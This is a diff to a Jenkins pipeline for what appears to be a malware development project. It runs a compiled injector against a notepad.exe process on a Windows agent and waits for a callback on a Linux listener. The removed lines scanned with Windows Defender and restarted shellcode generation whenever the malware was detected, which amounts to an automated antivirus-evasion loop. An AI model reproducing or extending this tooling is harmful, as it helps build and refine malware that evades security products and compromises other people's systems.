@@ -47,85 +47,50 @@ pipeline {
         stage('Execute Malware and Test Callback') {
             agent none
             stages {
-                stage('Start Listener') {
-                    agent { label 'linux' }
-                    steps {
-                        dir('scripts') {
-                            sh '''
-                                echo "[*] Starting listener..."
-                                (uv run pipeline callback > listener.log 2>&1; echo $? > callback_result.txt) &
-                                echo $! > listener.pid
-                            '''
+                stage('Start listener then run malware') {
+                    parallel {
+                        stage('Start Listener') {
+                            agent { label 'linux' }
+                            steps {
+                                dir('scripts') {
+                                    script {
+                                        def result = sh(script: 'uv run pipeline callback', returnStdout: true).trim()
+                                        writeFile file: 'callback_result.txt', text: result
+                                        env.CALLBACK_RESULT = result
+                                    }
+                                    stash includes: 'callback_result.txt', name: 'callback_result'
+                                }
+                            }
+                        }
+
+                        stage('Run Malware') {
+                            agent { label 'windows' }
+                            steps {
+                                dir('testing') {
+                                    unstash 'compiled_malware'
+                                    powershell '''
+                                        Start-Sleep -Seconds 15
+                                        $proc = Start-Process -FilePath 'notepad.exe' -PassThru
+                                        Start-Sleep -Seconds 2
+                                        $targetPid = $proc.Id
+                                        Write-Host "Target PID: $targetPid"
+                                        Start-Process -FilePath ".\\injector.exe" -ArgumentList $targetPid
+                                    '''
+                                }
+                            }
                         }
                     }
                 }
 
-                stage('Run Malware') {
-                    agent { label 'windows' }
-                    steps {
-                        dir('testing') {
-                            unstash 'compiled_malware'
-                            powershell '''
-                                $proc = Start-Process -FilePath 'notepad.exe' -PassThru
-                                Start-Sleep -Seconds 2
-                                $targetPid = $proc.Id
-                                Write-Host "Target PID: $targetPid"
-                                Start-Process -FilePath ".\\injector.exe" -ArgumentList $targetPid
-                            '''
-                        }
-                    }
-                }
-
-                stage('Evaluate Callback and AV Detection') {
+                stage('Check Callback Result') {
                     agent { label 'linux' }
                     steps {
-                        dir('scripts') {
-                            sh '''
-                                echo "[*] Waiting for listener to finish or timeout..."
-                                for i in {1..90}; do
-                                    if [ -f callback_result.txt ]; then
-                                        echo "[*] Callback result file found."
-                                        break
-                                    fi
-                                    if ! kill -0 $(cat listener.pid) 2>/dev/null; then
-                                        echo "[!] Listener process exited but no result file written."
-                                        break
-                                    fi
-                                    sleep 1
-                                done
-
-                                if [ ! -f callback_result.txt ]; then
-                                    echo "[!] callback_result.txt was never created!"
-                                    cat listener.log || true
-                                    exit 1
-                                fi
-                            '''
-
-                            script {
-                                def result = sh(script: 'cat scripts/callback_result.txt', returnStdout: true).trim()
-                                echo "Callback listener exited with code: ${result}"
-
-                                def shouldRetry = (result != '0')
-
-                                // Run Defender scan to detect AV alerts
-                                def avOutput = powershell(script: '''
-                                    $ScanResult = Start-MpScan -ScanType CustomScan -ScanPath "C:\\Jenkins\\workspace\\Malware_Pipeline_staging\\testing"
-                                    $Events = Get-MpThreatDetection | Out-String
-                                    Write-Output $Events
-                                    if ($Events -match 'injector.exe') { exit 1 } else { exit 0 }
-                                ''', returnStatus: true)
-
-                                if (avOutput != 0) {
-                                    echo '[!] Windows Defender detected the malware!'
-                                    shouldRetry = true
-                                }
-
-                                if (shouldRetry) {
-                                    currentBuild.description = 'Callback failed or AV alert — restarting from Generate Shellcode'
-                                    build job: env.JOB_NAME,
-                                          parameters: [string(name: 'RESTART_STAGE', value: 'generate')],
-                                          wait: false
-                                }
+                        unstash 'callback_result'
+                        script {
+                            def result = readFile('callback_result.txt').trim()
+                            echo "Callback result: ${result}"
+                            if (result != '0') {
+                                error('Callback failed. Marking build as failed.')
                             }
                         }
                     }
